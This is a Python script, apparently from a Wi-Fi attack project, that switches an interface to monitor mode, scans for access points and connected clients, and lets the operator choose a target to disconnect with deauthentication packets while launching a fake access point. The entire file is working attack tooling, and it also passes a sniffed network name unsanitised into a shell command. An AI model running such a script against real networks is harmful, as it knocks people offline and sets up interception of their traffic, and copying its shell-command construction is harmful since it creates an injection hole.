import os
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
from rich.console import Console
from rich.table import Table

# Reference to the scanning parts - https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy

# import json

ap_list = []
### Coloum indices for 'ap_list'. 
ESSID = 0
BSSID = 1
CHANNEL = 2
essids_set = set()

client_list = []


### Console colors
W  = '\033[0m'  # white 
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan


"""
In this function the user choose the interface that will scan the network and switch it to monitor mode.
"""
def monitor_mode():
    global interface
    print(G + "*** Step 1:  Choosing an interface to put in 'monitor mode'. *** ")
    # Extract the interface names and put them in a list
    interfaces = os.listdir('/sys/class/net/')
    # Print the interface names
    table = Table(title="Available interfaces")
    table.add_column("OP", justify="center", style="bold")
    table.add_column("Interface", justify="center", style="bold")
    for x in range(len(interfaces)):
        table.add_row(str(x), interfaces[x])
    console = Console()
    console.print(table)
    # Choose the interface to put in monitor mode
    i = input(G + "Please enter the interface name you want to put in 'monitor mode': ")
    print(W)
    i = int(i)
    interface = interfaces[i]
    # Put the choosen interface in 'monitor mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')


"""
In this function the responsible for switch back to managed mode
"""
def managed_mode():
    print(G + "\n*** Step 5: Put the interface back in 'managed mode'. *** \n")
    # empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........")
    print(W)
    # Put the choosen interface back in 'managed mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode managed')
    os.system('ifconfig ' + interface + ' up')
    print(B + "[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
    os.system('iwconfig')


"""
In this function the responsible for Scanning the network for AP to attack
"""
def ap_scan_rap():
    print(G + "*** Step 2: Scanning the network for AP to attack. *** \n")
    # empty = input ("Press Enter to continue.........")
    ap_scan()

                                         
"""
In this function the responsible for Scanning the network for AP to attack
"""
def ap_scan():
    global search_timeout
    search_timeout = input(G + "Please enter the scanning time frame in seconds [default: 5]: ")
    if search_timeout == "":
        search_timeout = 5
    else:
        search_timeout = int(search_timeout)

    channel_changer = Thread(target = change_channel)
    # A daemon thread runs without blocking the main program from exiting
    channel_changer.daemon = True
    channel_changer.start()

    print("\n Scanning for networks...\n")

    # Sniffing packets - scanning the network for AP in the area
    sniff(iface = interface, prn = ap_scan_pkt, timeout=search_timeout)
    num_of_ap = len(ap_list)
    # If at least one AP was found, print all the found APs
    if num_of_ap > 0: 
        table = Table(title="APs found")
        table.add_column("OP", justify="center", style="bold")
        table.add_column("ESSID", justify="center", style="bold")
        table.add_column("BSSID", justify="center", style="bold")
        table.add_column("CHANNEL", justify="center", style="bold")
        for x in range(len(ap_list)):
            table.add_row(str(x), ap_list[x][ESSID], ap_list[x][BSSID], str(ap_list[x][CHANNEL]))
        console = Console()
        console.print(table)

        # Choosing the AP to attack
        ap_index = int(input("Please enter the number of the AP you want to attack: "))
        # Print the choosen AP
        print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
        # Set the channel as the choosen AP channel in order to send packets to connected clients later
        set_channel(int(ap_list[ap_index][CHANNEL]))
        # Save all the needed information about the choosen AP
        global ap_mac
        global ap_name
        global ap_channel
        ap_mac = ap_list[ap_index][BSSID]
        ap_name = ap_list[ap_index][ESSID]
        ap_channel = ap_list[ap_index][CHANNEL]
    else: 
        # If no AP was found. 
        rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
        if rescan == "n":
            print("  Sorry :(  ")
            managed_mode()
            sys.exit(0)
        else:
            ap_scan()

"""
This function is resposible for check in each channel in the range [1,14]. 
"""
def change_channel():
    channel_switch = 1
    while True:
        os.system('iwconfig %s channel %d' % (interface, channel_switch))
        # switch channel in range [1,14] each 0.5 seconds
        channel_switch = channel_switch % 14 + 1
        time.sleep(0.5)


"""
This function is resposible for set ithe seleced channel
"""
def set_channel(channel):
    os.system('iwconfig %s channel %d' % (interface, channel))

### Dot11 represent the MAC header, it is the abbreviated specification name 802.11
### Dot11Elt layers is where we put the necessary information: SSID, supported speeds (up to eight), additional supported speeds, channel used.
### Dot11Beacon represents an IEEE 802.11 Beacon

### sniff(..., prn = ap_scan_pkt, ...) 
### The argument 'prn' allows us to pass a function to apply to each packet sniffed
def ap_scan_pkt(pkt):
    # We are interested only in Beacon frame
    # Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN
    if pkt.haslayer(Dot11Beacon):
        # Get the source MAC address - BSSID of the AP
        bssid = pkt[Dot11].addr2
        # Get the ESSID (name) of the AP
        essid = pkt[Dot11Elt].info.decode()
        # Check if the new found AP is already in the AP set
        if essid not in essids_set:
            essids_set.add(essid)
            # network_stats() function extracts some useful information from the network - such as the channel
            stats = pkt[Dot11Beacon].network_stats()
            # Get the channel of the AP
            channel = stats.get("channel")
            # Add the new found AP to the AP list
            ap_list.append([essid, bssid, channel])
            # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (essid, bssid, channel))

"""
This function is resposible finding the clients that connected to the AP
"""
def client_scan_rap():
    print(G + "\n*** Step 3: Verifying that at least 1 client is connected to the AP you choose. *** \n")
    # empty = input ("Press Enter to continue.........")
    print(W)
    # os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
    client_scan()
    print("\n")


"""
This function is resposible finding the clients that connected to the AP
"""
def client_scan():
    s_timeout = search_timeout * 2
    print(G + "\nScanning for clients that connected to: " + ap_name + " ...")
    '''
    channel_changer = Thread(target=change_channel)
    # A daemon thread runs without blocking the main program from exiting
    channel_changer.daemon = True
    channel_changer.start()
    '''
    # Sniffing packets - scanning the network for clients which are connected to the choosen AP 
    sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
    num_of_client = len(client_list)
    # If at least one client was found, print all the found clients
    if num_of_client > 0: 
        # If at least 1 client was found. 
        print("\n*************** Clients Table ***************\n")
        for x in range(num_of_client):
            print("[" + str(x) + "] - "+ client_list[x])
        print("\n************** FINISH SCANNING **************\n")
        # Choosing the AP to attack
        client_index = input("Please enter the number of the client you want to attack or enter 'R' if you want to rescan: ")
        if client_index == 'R': 
            # Rescan
            client_scan()
        elif client_index.isnumeric():
            # Client was choosen
            # Print the choosen AP
            print("You choose the client: [" + client_index + "] - "+ client_list[int(client_index)])
            global client_mac
            # Save the needed information about the choosen client
            client_mac = client_list[int(client_index)]
            # deauth_attack()
    else: 
        # If no client was found. 
        rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
        if rescan == "n":
            print("  Sorry :(  ")
            managed_mode()
            sys.exit(0)
        else:
            client_scan()
  

### The argument 'prn' allows us to pass a function that executes with each packet sniffed 
def client_scan_pkt(pkt):
    global client_list
    # ff:ff:ff:ff:ff:ff - broadcast address 
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                # Add the new found client to the client list
                client_list.append(pkt.addr1)
                print("Client with MAC address: " + pkt.addr1 + " was found.")

"""
This function is resposible for preforming the attack, it will send the deauthentication packets between the choosen AP and client. 
"""
def deauth_attack():
    print("\n*** Step 4: Disconnect the connection between the AP from the client. *** \n")
    print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
    empty = input ("Press Enter to start sending the Deauthentication packets.........")
    print(W)
    # Open a new terminal for 'fake_ap.py'
    os.system('gnome-terminal -- sh -c "python3 attack/fake_ap.py "' +  ap_name)
    # In the current terminal we will send non-stop deauthentication packets
    os.system('python3 attack/deauth.py ' + client_mac + ' ' + ap_mac + ' ' + interface)


if __name__ == "__main__":
    
    if os.geteuid():
        sys.exit(R + '[**] Please run as root')
    
    print(B + "********************************************************************** \n")
    print("***** Part 1: choosing the AP we want to attck and attacks it ;) ***** \n")
    print("********************************************************************** \n")
    
    ### Step 1: Choosing the interface for monitoring, and put it in monitor mode. 
    monitor_mode()

    ### Step 2: Choosing the AP that we want to attack. 
    ap_scan_rap()
    
    ### Step 3: Checking that the choosen AP have client that connected to it.
    client_scan_rap()
    
    ### Step 4: Running the deauthentication script.
    deauth_attack()
    
    ### Step 5: Put the interface back in managed mode  
    managed_mode()
    